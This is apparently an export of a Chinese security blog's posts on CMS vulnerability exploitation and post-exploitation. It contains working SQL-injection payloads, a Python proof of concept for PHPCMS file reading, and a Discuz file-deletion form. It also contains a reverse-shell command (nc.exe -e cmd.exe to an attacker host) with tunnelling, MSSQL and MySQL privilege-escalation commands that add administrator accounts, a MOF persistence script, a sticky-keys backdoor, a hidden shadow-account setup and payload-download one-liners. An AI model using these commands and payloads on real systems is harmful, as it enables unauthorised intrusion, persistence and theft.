    <content type="text"><![CDATA[0x01 漏洞分析本次漏洞发生在/user/del.php中，首先，这里的pagename和tablename可以看到都是通过POST方法传进来的，但是只是用trim函数简单的处理了一下，之后也没有任何过滤的手段了，因此是一个比较简单的sql注入了。 在后面的112行将tablename带入到了sql语句中查询，并且tablename变量并没有用单引号包裹，可以直接发挥各种姿势。 0x02 漏洞利用这里有几点需要注意的是，在自己测试的时候需要注意zzcms_main中一定要有数据，否则的话会不成功的 payload大概如下，这里用的是盲注 放一下我的python利用代码： 效果：]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>漏洞分析</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPCMS v9.6.1任意文件读取漏洞]]></title>
    <url>%2F2018%2F06%2F10%2F9%2F</url>
    <content type="text"><![CDATA[0x01 漏洞分析首先本次漏洞的问题函数不在于某一处函数或者语句，而是在与多方面的因素共同作用，最终可以进行绕过从而进行任意文件读取。在phpcms中，有一个file_down函数用来下载文件的，该函数位于/phpcms/libs/functions/global.func.php 该函数就是一个正常的文件下载的函数，而调用这个函数的地方位于phpcms\modules\content\down.php 这里我们从下往上分析，首先调用file_down函数的fileurl参数中的&lt;&gt;被替换成空，往上看发现fileurl是当变量m存在时，变量s与之前的fileurl进行拼接而来的，再往上看发现之前的fileurl是变量f，因此我们要下载的文件参数是通过变量s和变量f拼接而来的！继续向上看，发现有一个parse_str($a_k)，因此变量s和变量f是通过parse_str解析a_k变量来的，而a_k变量是通过get方式接收的，因此可控！所以就有风险了。 不过我们能够发现，变量a_k在传进来之后，被传入到了一个sys_auth函数重新赋值了，这个函数是phpcms中一个用来加解密的函数，位于/phpcms/libs/functions/global.func.php 这里通过pc_auth_key变量的密钥进行解密。 到目前为止我们需要的是一个使用pc_auth_key密钥，通过sys_auth函数加密过的a_k变量，并且其中的s和f变量是我们可控的，从而才能通过解析出来后拼接，然后带入到file_down函数下载任意文件。 幸运的是，就在down.php中的init函数可以满足这个条件 可以看到在init函数的后边，就有一个将a_k变量同pc_auth_key进行加密，并且之后传入了download函数123$pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;);$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &apos;ENCODE&apos;, $pc_auth_key));$downurl = &apos;?m=content&amp;c=down&amp;a=download&amp;a_k=&apos;.$a_k; 然后我们来从头看一下init函数。首先通过get方式接受参数a_k，然后将这个a_k变量进行解密，然后通过safe_replace函数进行过滤，然后通过parse_str进行解析，从而得到了s变量和f变量。所以这一阶段我们就需要一个加密过的a_k然后传给init函数。这里用到了之前phpcms的一个sql注入的利用方式，在位于/phpcms/modules/attachment/attachments.php 的swfupload_json()函数，代码如下： 这里主要看一下src参数，这里src参数通过get方式接收之后用trim函数去除首尾的空白符，然后通过过safe_replace函数进行过滤，之后通过arr数组进行json编码，后面出入到了set_cookie函数中，而这个函数位于/phpcms/libs/classes/param.class.php，代码如下： 可以看到进入后会通过for循环遍历数组，然后src的值会被sys_auth加密！现在我们可以回过头看一下之前一直被提到的safe_replace函数的作用吧，代码位于/phpcms/libs/functions/global.func.php，代码如下： 发现是将敏感符号替换为空，这个绕过就很好绕过了，比如当我们想输入单引号的时候%27，我们只要在其中加入一个位于黑名单的符号就可以了，比如%2;7，分号会被检测到然后替换成空，剩下了%27即为单引号了。 既然刚才在swfupload_json函数中找到了我们想要的结果，那么我们就看一下attachments类的构造函数，看看调用这个swfuplaod_json函数需要什么条件吧 函数最下面如果userid为空，会调用showmessage函数，那样程序会被中断的，因此就必须要userid有数据，那么往上看1$this-&gt;userid = $_SESSION[&apos;userid&apos;] ? $_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;)); 上述语句是关键以seesion方式接收userid参数，当$_SESSION[‘userid’]有数据时，返回$_SESSION[‘userid’]，当为空时，进行判断：静态调用param类的get_cookie函数，并给该函数传递_userid字符串，如果返回不为空执行param::get_cookie(‘_userid’)，如果为空就执行sys_auth($_POST[‘userid_flash’],’DECODE’))sys_auth函数在这里进行解密操作，将用post方式接收到的userid_flash参数值，放进sys_auth函数进行解密session是在服务器端生成的，在不能登录的情况下，session中的userid是空的，因此就会执行get_cookie函数，该函数代码如下 ![](/images/PHPCMSv9.6.1任意文件读取漏洞14.png） 其中有sys_auth的解密操作，而如果get_cookie没结果也得DECODE，所以说这里decode是一个必须的操作，不过好消息是decode的目标是我们可以控制的，要么是cookie中的cookie_pre_userid，要么是post过去的userid_flash参数这里以cookie为例，如果我们需要一个通过set_cookie的加密过的cookie，让它传送到这里，然后就可以通过get_cookie进行解密，从而绕过这里的限制 这里用wap模块的一个地方，代码位于/phpcms/modules/wap/index.php 通过第9行调用set_cookie函数，就可以生成一个加密好的cookie了。 0x02 总线这次漏洞分析大概就是以寻找加密解密来进行分析的，总结了一下流程，如下 至此分析结束，下面设计一下poc 0x03 POC123456789101112131415161718192021222324import requestsurl_1 = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1&quot;r_g = requests.get(url_1)for cookie in r_g.cookies: if &apos;_siteid&apos; in cookie.name: userid = cookie.value print &quot;siteid: &quot; + userid + &quot;\n&quot;url_2 = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp&quot;# ?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad=x&amp;i=1&amp;modelid=1&amp;catid=1&amp;d=1&amp;m=1&amp;s=index&amp;f=.p%253chpdata_1 = &#123;&apos;userid_flash&apos;: userid&#125;r_p = requests.post(url = url_2, data= data_1)for cookie in r_p.cookies: if &apos;_att_json&apos; in cookie.name: att_json = cookie.value print &quot;att_json: &quot; + att_json + &quot;\n&quot;key = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&quot; + att_jsonprint key 0x04 演示运行脚本]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>漏洞分析</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计-熊海CMSv1.0]]></title>
    <url>%2F2018%2F06%2F10%2F%E7%86%8A%E6%B5%B7CMSv1-0%2F</url>
    <content type="text"><![CDATA[0x01 前言无意间发现一个代码审计的以前文章，是审计一篇cms的文章，然后就想着还没有认真的审计过一次呢，就跟着这篇文章的路子走一次吧，来开启我代码审计的篇章。 0x02 审计之旅首先在站长之家下载了熊海CMS v1.0的源代码，本地搭建好环境之后，将项目拖到Seay代码审计系统中，来一波自动审计~ 咳咳，经然后34个漏洞发现。。。好吧，毕竟小站源码，也很正常。然后就开始一个一个查看了，看看是否有误报和漏报。 0x03 文件包含 首先，index.php中的代码如下，明显就是一个文件包含漏洞嘛，这里参数r没有任何过滤直接放到include()函数中了，但是这里include是在files目录下的，所以需要../进行目录改变。我们可以在根目录下新建一个shell.php，写入&lt;?php phpinfo();?&gt;，然后尝试包含一下 果然成功了！嘻嘻 0x04 越权漏洞看了一下其他的漏洞，发现除了admin没看，其他的都是误报，但是现在我们还没有办法得到管理员的账号和密码，因此admin的先不看，看一下inc目录下的文件。inc目录下的都是配置文件，很重要，要每一个文件都仔细查看。 在看到checklogin.php的时候，发现了一个越权漏洞。 这里是从cookie中判断时候是管理员的机制，如果cookie中的user为空，就为跳转到?r=login页面，这个页面是后台登陆页面 那么如果我们抓包后将user的值修改成不为空会怎么样呢？这里用wzlist.php试一下1http://127.0.0.1/admin/?r=wzlist 然后就发现进入了后台。。。 并且只要保证每次cookie中user参数都有值就可以访问后台的所有内容。 之后再看其他的配置文件就看不出来什么了….那么记下来就是看一下admin目录下的文件吧。 0x05 SQL注入1首先肯定要看登陆页面了，如果能够爆出用户名和密码就完美了。查看login.php，入眼的就是一段令人激动的代码 这里user和password是直接获取POST传来的参数，并没有进行任何过滤，很容易想到万能密码的使用，但是继续看代码我们发现，这里是先进行user的查询，如果user在数据库中存在，那么就进行password的比较，是将我们输入的password进行md5哈希一下，然后与数据库中的进行比对，所以说万能密码在这里是没有用的，但是我们却可以用报错注入得到用户名和密码。123user=123&apos; or extractvalue(1,concat((select concat(0x7e,password,0x7e) from manage)))#&amp;password=或者user=123&apos; or updatexml(1,concat((select concat(0x7e,password,0x7e) from manage)),0)#&amp;password= 但是这里有一点比较坑的是，这里注出来的password最多只有27位，但是数据库存的是password的MD5值，有32位，所以说得到的md5是不对的，需要进行两次注入才能得到完整的密码，以extractvalue()函数为例,payload需要这样写 12user=123&apos; or extractvalue(1,concat((select concat(0x7e,password) from manage)))#&amp;password=user=123&apos; or extractvalue(1,concat((select concat(password,0x7e) from manage)))#&amp;password= 两次自己拼接一下就得到了完整的password的md5值了，拿去解密一下就好了~ 0x06 SQL注入2进入后台之后，可以看一下之前自动审计报的后台的SQL注入漏洞，拿newlink.php为例 这里的变量都是直接POST传进来并且没做任何过滤，那么就存在了SQL注入问题。利用之前的报错注入验证一下 得到结果 验证成功。 0x07 CSRF漏洞这里的内容管理中有一个删除文章的功能，点击后抓包得到url1http://localhost/code_audit/xhcms/admin/?r=wzlist&amp;delete=16 退出管理员账号，根据之前的越权漏洞分析，这里应该会转跳到login的界面，试一下，果然如此。 然后重新登陆管理员后点击该url，真的删除了该文章 验证成功。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Discuz小于3.3任意文件删除漏洞]]></title>
    <url>%2F2018%2F06%2F10%2FDiscuz%E5%B0%8F%E4%BA%8E3.3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 前言之前网上爆的的是Discuz！&lt;=3.4的任意文件删除漏洞，为什么这里变成3.3了呢？因为厂商已经把3.4的修复了，不过3.3版本还是存在问题的。 0x02 漏洞复现首先，在本地创建一个我们要删除的测试文件 注册一个账号 然后点击保存，用burp抓个包，就可以得到我们的formhash，并在birthprovince中修改成我们要删除的文件路径(../../../test.txt) 然后可以在本地创建一个文件上传的表单1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1:8080/code_audit/Discuz_X3.3_SC_UTF8/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;formhash&quot; value=&quot;a7ccdf77&quot;/&gt; &lt;input type=&quot;text&quot; name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/from&gt;&lt;/body&gt;&lt;/html&gt; 然后点击上传 就完成了删除文件了~![](/images/Discuz3.3任意文件删除漏洞7.png 0x03 漏洞分析这里漏洞出现在/upload/source/include/spacecp/spacecp_profile.php 这里第182、183行有两个unlink()函数可以删除文件，但是需要formtype=file才可以，我们把这里的打印出来 发现并不是file，因此不能在这里进行删除，继续往下看， 第229行有一个unlink()函数，并且没有任何判断，也就是说只要程序运行到这里，就可以删除文件。看一下条件1@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); 这里向上回溯，看一下$space[$key]在哪里。 出现在第23行，发现这个就是用户的个人设置，我们可以选择birthprovince，修改成要删除的文件就好了，然后实现一个上传文件 的表单，就可以删除文件了。]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>漏洞分析</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux的SUID提权]]></title>
    <url>%2F2018%2F06%2F10%2FLinux%E7%9A%84SUID%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[0x01 SUID什么是suid？通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。 0x02 SUID提权那么什么是suid提权呢？我理解的就是有个文件，它有s标志，并且他输入root，那么我们运行这个程序就可以有了root的权限，并且这个程序还得能执行命令，不然没什么用处，那么我们就能从普通用户提升到了root权限了。 0x03 常见的可用于suid提权的命令123456789101112131415NmapVimfindBashMoreLessNanocp 0x04 查找符合条件的文件123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 0x05 详细介绍 nmap老版的nmap(2.02-5.21)有相互的功能–interactive123nmap&gt; !shsh-3.2# whoamiroot msf中也有相关的模块1exploit/unix/local/setuid_nmap find 如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。12touch testfind test -exec whoami \; vim 如果vim以SUID运行，就会继承root用户的权限，可以读取系统中所有的文件 12vim/vi:shell bash 12bash -p&gt;# id less/more 12less /etc/passwd!/bin/sh]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>后渗透</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录一次内网渗透]]></title>
    <url>%2F2018%2F06%2F10%2F%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[在公司进行渗透测试项目，网站是asp的网站，有个上传点，但是上传的后缀名只能是jpg,gif,png，通过00截断绕过，但是文件名不能有asp，因此通过构造形如1aaa.cer%00.jpg 进行绕过。但是发现服务器端会对上传的内容进行危险代码检测，&lt;%是不能存在于里面的，Fuzz了一波后发现如果上传的文件头是GIF89a的话，并且一句话木马不在最后位置就可以进行绕过。成功得到shell 得到shell后发现权限比较低，是iis的 并没有想着提权，而是打算利用ew来把内网先带出来，然后进行内网的进一步扫描 通过tasklist命令，发现存在360杀毒软件，因此找了一个目录，将免杀的工具上传。 上传了一个nc.exe 打算获取一个交互式的shell（菜刀的shell不是交互式的，有的时候不好用）现在我们的公网服务器上执行1nc -lvvp 4444 监听4444端口 然后，在“肉鸡”上执行1nc.exe -e cmd.exe [公网ip] 4444 发现在公网服务器上已经获取了交互式的shell 然后上传免杀的windows版本的ew首先，在公网服务器上执行1./ew -s rcsocks -l 1080 -e 55 然后在“肉鸡”上执行1ew.exe -s rssocks -d [公网ip] -e 55 最后在我们的机器上，在proxychains.conf 添加1socks5 [公网ip] 1080 然后在我们机器上执行1proxychains msfconsole 就可以了，现在我们的msf就相当于在对方的内网当中了，扫一波smb]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSSQL提权之sp_oacreate]]></title>
    <url>%2F2018%2F06%2F10%2FMSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bsp-oacreate%2F</url>
    <content type="text"><![CDATA[0x01 前提如果xp_cmdshell组件被删除了话，还可以使用sp_oacreate来进行提权。 0x02 开启sp_oacreate开启12exec sp_configure &apos;show advanced options&apos;,1;reconfigure;exec sp_configure &apos;ole automation procedures&apos;,1;recofigure; 关闭123exec sp_configure &apos;show advanced options&apos;,1;reconfigure;exec sp_configure &apos;ole automation procedures&apos;,0;reconfigure;exec sp_configure &apos;show advanced options&apos;,0;reconfigure; 0x03 直接写用户123declare @shell intexec sp_oacreate &apos;wscript.shell&apos;, @shell outexec sp_method @shell, &apos;run&apos; , null, &apos;c:\windows\system32\cmd.exe \c &quot;net user test pinohd123. /add&quot; &apos; 123declare @shell intexec sp_oacreate &apos;shell.application&apos;,@shell outexec sp_oamethod @shell, &apos;shellexecute&apos;, null, &apos;cmd.exe&apos;, &apos;cmd /c net user test pinohd123. /add&apos;, &apos;c:\windows\system32&apos;, &apos;&apos;,&apos;1&apos;; 0x04 其他操作删除文件12345declare @result intdeclare @fso_token intexec sp_oacreate &apos;scripting.filesystemobject&apos;, @fso_token outexec sp_oamethod @fso_token,&apos;deletefile&apos;,null,&apos;c:\1.txt&apos;exec sp_oadestroy @fso_token 复制文件123declare @o intexec sp_oacreate &apos;scripting.filesystemobject&apos;,@o outexec sp_oamethod @o,&apos;copyfile&apos;,null,&apos;c:\1.txt&apos;,&apos;c:\2.txt&apos; 移动文件123declare @o intexec sp_oacreate &apos;scripting.filesystemobject&apos;,@o outexec sp_oamethod @o,&apos;movefile&apos;,null,&apos;c:\1.txt&apos;,&apos;c:\3.txt&apos; 替换粘滞键123456declare @o intexec sp_oacreate &apos;scripting.filesystemobject&apos;, @o outexec sp_oamethod @o,&apos;copyfile&apos;,null,&apos;c:\windows\explorer.exe&apos;, &apos;c:\windows\system32\sethc.exe&apos;declare @oo intexec sp_oacreate &apos;scripting.filesystemobject&apos;, @oo i=outexec sp_oamethod @oo,&apos;copyfile&apos;,null,&apos;c:\windows\system32\sethc.exe&apos;,&apos;c:\windows\system32\dllcache\sethc.exe&apos;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>后渗透</tag>
        <tag>Mssql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSSQL提权之xp_cmdshell]]></title>
    <url>%2F2018%2F06%2F10%2FMSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bxp-cmdshell%2F</url>
    <content type="text"><![CDATA[0x01 前提 getshell或者存在sql注入并且能够执行命令。 sql server是system权限，sql server默认就是system权限。 0x02 xp_cmdshell有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。 开启xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure; 关闭xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;, 0;reconfigure 0x03 提权12exec master..xp_cmdshell &apos;net user test pinohd123. /add&apos; 添加用户test，密码testexec master..xp_cmdshell &apos;net localgroup administrators test add&apos; 添加test用户到管理员组]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>后渗透</tag>
        <tag>Mssql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL提权之UDF]]></title>
    <url>%2F2018%2F06%2F10%2FMySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF%2F</url>
    <content type="text"><![CDATA[0x01 UDFUDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 0x02 windows下udf提权的条件 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/ 如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。 0x03 提权方法如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。 接下来就是干货的地方了，反正我遇到下面一些问题的时候谷歌是找不到答案的（幸亏有大佬相助=。= ） udf.dll这个东西对于小白来说是不容易找到的（譬如我），后来才知道原来大名鼎鼎的sqlmap里是有udf.dll文件的，就在sqlmap/udf/mysql/windows目录下，里面有32位和64位，注意：这里的位数是mysql的位数，并不是对方系统的位数。如果你遇到了如图的错误： 那么一定要检查一下是不是位数搞错了，反正我是因为这个错误。 还有一个需要注意的是，sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中，在sqlmap/extra/cloak目录下的cloak.py就是。解密之后会在当前目录下生成dll文件。 将dll文件复制到mysql的/lib/plugin目录下，执行1create function cmdshell returns string soname &quot;lib_mysqludf_sys.dll&quot;; 结果报错了 那么这里需要注意的是，需要创建udf中存在的函数才可以，可以用十六进制编辑器打开udf.dll，看一下有哪些函数可以创建 大概就是这些了，我们可以使用sys_exec函数成功，然后试验一下： 成功弹出计算器！]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>后渗透</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL提权之MOF]]></title>
    <url>%2F2018%2F06%2F10%2FMySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF%2F</url>
    <content type="text"><![CDATA[0x01 前言Windows管理规范(WMI)提供了如下三种方法编译WMI存储库的托管对象格式（MOF）文件： 将MOF文件执行为命令行参数及Mofcomp.exe文件 使用IMofCompiler接口和$CompileFile方法 拖放到%SystemRoot%\System32\Wbem\MOF文件夹下的MOF文件中 使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。 0x02 漏洞利用方法 将一下代码保存为nullevt.mof文件 123456789101112131415161718192021222324#pragma namespace(&quot;\\.\root\subscription&quot;)instance of __EventFilter as $EventFilter&#123;EventNamespace = &quot;Root\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123;Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;;&#125;;instance of __FilterToConsumerBinding&#123;Consumer = $Consumer;Filter = $EventFilter;&#125;; 通过MySQL查询将文件导入 1select load_file(&apos;c:\\recycler\\nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;; 导入后，系统会自动运行该文件。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>后渗透</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限维持之从隐藏账户到影子账户]]></title>
    <url>%2F2018%2F06%2F10%2F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E4%BB%8E%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E5%88%B0%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7%2F</url>
    <content type="text"><![CDATA[0x01 关于权限维持很多时候，当我们获得到一个windows服务器的权限后，若某天服务器的管理员发现后修补了漏洞，那么我们就可能失去了这台服务器的权限了，因此权限维持就很有必要了，对于windows服务器来说，我们可以添加一个账户，打开它的3389端口，从而维持我们对一个服务器的权限。 0x02 权限维持之简单的账户添加最简单的方法就是用net user来添加账户了，命令如下123456789101112131415161718192021222324252627282930313233343536net user username password /add``` ![](/images/权限维持之从隐藏账户到影子账户1.png)这种添加账户的方法，服务器管理员可以通过**net user**命令很快的发现。## 0x03 权限维持之添加隐藏账户相比上面那个很简单的添加账户，在windows下，如果在用户名后面添加一个$符号的话，那么通过**net user**的方式是看不到的。![](/images/权限维持之从隐藏账户到影子账户2.png)我们可以看到，我添加的test1$用户是看不到的，不过这种情况也是可以通过管理界面下看到的。键入Win+R，输入compmgmt.msc，打开管理界面，然后在右侧的本地用户和组中，双击用户可以看到我们之前添加的test1$用户。![image.png](/images/权限维持之从隐藏账户到影子账户3.png)## 0x04 权限维持之添加影子账户影子账户，顾名思义就像影子一样，跟主体是一模一样的，通过建立影子账户，可以获得跟管理员一样的权限，还不容易被发现。首先，创建一个隐藏账户，test2$![](/images/权限维持之从隐藏账户到影子账户4.png)然后，键入Win+R，然后输入regedit，打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/选项，![](/images/权限维持之从隐藏账户到影子账户5.png)这里面有很多相同格式的字符串的名字还有一个Names的菜单，点击Names，可以看到计算机中所有的账户名称，选中我们刚才创建的test2$账户，可以看到右侧是0x3f4![](/images/权限维持之从隐藏账户到影子账户6.png)记住这个十六进制数字然后返回上层，找到000003F4，这个是一会我们要做的事情，同理，找到Administrator的十六进制数字，我这里是1f4，故而打开000001F4![](/images/权限维持之从隐藏账户到影子账户7.png)我们可以看到有三个选项，双击F，复制里面的所有内容，然后打开刚才说的000003F4，双击F，将刚才复制的内容粘贴上去，保存。之后，分别右键Names中的test2$和000003F4两个目录，选择导出，将注册表导出。接下来，我们打开命令行，输入 net user test2$ /del`删除创建的用户 再双击刚才导出的两个注册表，这样影子账户就创建好了。 然后我们看一下net user 看不到test2$账户。 再打开管理界面中的本地组和用户好的，还是看不到test2$ 最后打开注册表看一下可以看到，存在test2$，影子账号创建完毕！]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows7升级powershell2到powershell3]]></title>
    <url>%2F2018%2F06%2F10%2FWindows7%E5%8D%87%E7%BA%A7powershell2%E5%88%B0powershell3%2F</url>
    <content type="text"><![CDATA[0x01 前言最近在学习Windows渗透，其实说白了就是学习各种Windows的特性，昨天接触到了一款powershell渗透框架， 叫做nishang，学习的过程中发现脚本就是不执行，后来才发现是因为我用的虚拟机是windows7，默认的powershell版本是2.0，而nishang需要的是powershell 3.0以上才可以使用，故而记录一下我升级的历程。 0x02 历程首先，win+r，输入appwiz.cpl，点击左侧的已安装的更新，看一下你的计算机中是否安装了Microsoft Windows Management Framework 3.0 Beta (KB2506143)，如果有的话就先把他卸载了。 然后在微软官网上下载.NET 4.0或者.NET 4.5 最后安装Microsoft Windows Management Framework 3.0的6.1内核版本安装文件，链接：http://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x64.msu 这就安装完成了，可以打开powershell，输入命令1get-host 查看powershell版本。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透中15种文件下载的方法]]></title>
    <url>%2F2018%2F06%2F10%2F%E6%B8%97%E9%80%8F%E4%B8%AD15%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x01 PowerShell 文件下载12$p = new-object system.net.webclient$p.downloadfile(&quot;http://xx.xx.xx.xx\file&quot;,&quot;c:\xxx\xx\file&quot;) 当然也可以直接将上面语句写入到一个脚本中，比如test.ps1然后powershell window中1.test.ps1 执行。 当然，默认情况下是无法执行powershell脚本的，需要在管理员权限下修改配置1powershell set-executionpolicy unrestricted 0x02 Visual Basic 文件下载123456789101112Set args = Wscript.ArgumentsUrl = &quot;http://192.168.43.68:8000/1.py&quot;dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)xHttp.Open &quot;GET&quot;, Url, FalsexHttp.Sendwith bStrm .type = 1 &apos; .open .write xHttp.responseBody .savetofile &quot; C:\users\pino\file\1.py&quot;, 2 &apos;end with 将上述代码保存在test.vbs然后使用1cscript test.vbs 执行文件下载 0x03 Perl 文件下载1perl -MLWP::Simple -e &apos;getstore (&quot;http://www.163.com/&quot;,&quot;163.html&quot;)&apos; 0x04 Python 文件下载1python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/1.py&quot;);localfile=open(&apos;c:\users\pino\file\1.py&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot; 0x05 Ruby 文件下载123456789#!ruby#!/usr/bin/rubyrequire &apos;net/http&apos;Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|r = http.get(&quot;/file&quot;)open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|file.write(r.body)&#125;&#125; 0x06 PHP 文件下载123456&lt;?$data = @file(&quot;http://xx.xx.xx/1.py&quot;);$f = fopen(&quot;c:\users\pino\1.py&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);?&gt; 0x07 FTP文件下载我们可以将想要执行的命令先写入一个txt中，然后用ftp命令就好了1.txt 12345open 127.0.0.1user_nameuser_passget file(文件名)quit 然后在命令行中执行1ftp -i -s:1.txt 0x08 TFTP 文件下载windows7 下默认是没有tftp的，可以WIN+R，然后输入appwiz.cpl，点击左侧的打开或关闭windows功能后，选中TFTP客户端即可启用TFTP客户端。 1tftp -i host(本地的，这里可以是127.0.0.1) GET c:\users\pino\1.py(用于保存在本地的文件名) 